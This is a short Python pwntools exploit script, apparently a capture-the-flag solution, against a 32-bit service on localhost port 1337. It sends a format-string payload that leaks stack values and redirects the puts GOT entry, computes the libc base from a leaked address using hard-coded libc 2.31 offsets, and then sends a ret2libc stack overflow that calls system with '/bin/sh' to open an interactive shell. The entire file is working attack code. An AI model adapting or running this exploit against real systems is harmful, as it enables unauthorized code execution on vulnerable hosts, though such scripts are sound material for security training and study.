from pwn import *
import struct


def f(a: int) -> bytes:
    return struct.pack('I', a)


# From objdump -d -Mintel
AddressOfPuts = 0x804c020
AddressOfPassedFirstHurdle = 0x80492e3
Name = ("AA%19$8x..%23$8x").encode() + f(AddressOfPuts)
Password = f(AddressOfPassedFirstHurdle)
Filename = ''

host = 'localhost'
port = '1337'


def main() -> None:
    p = remote(host, port, timeout=None)
    #  p = process(Filename)
    p.sendline(Name)
    p.sendline(Password)
    [print(p.recvline()) for _ in range(0, 2)]
    start_main = p.recv(20).decode()
    print(start_main)

    # Libc 2.31
    offsetForSh = 0x192352
    offsetForExit = 0x38170
    offsetForSystem = 0x45830
    offsetForstart_main = 0x1edf0
    libc_main_plus_x = 245

    start_main = "0x"+start_main.strip()[12:]
    addressOfLibc = (int(start_main, 16) - libc_main_plus_x) - \
        offsetForstart_main
    addressOfSh = addressOfLibc + offsetForSh
    addressOfExit = addressOfLibc + offsetForExit
    addressOfSystem = addressOfLibc + offsetForSystem

    payload = ("250382\x00" + 'A' * 21).encode() + \
        f(addressOfSystem) + f(addressOfExit) + f(addressOfSh) + f(0)
    p.sendline(payload)
    p.interactive()


main()
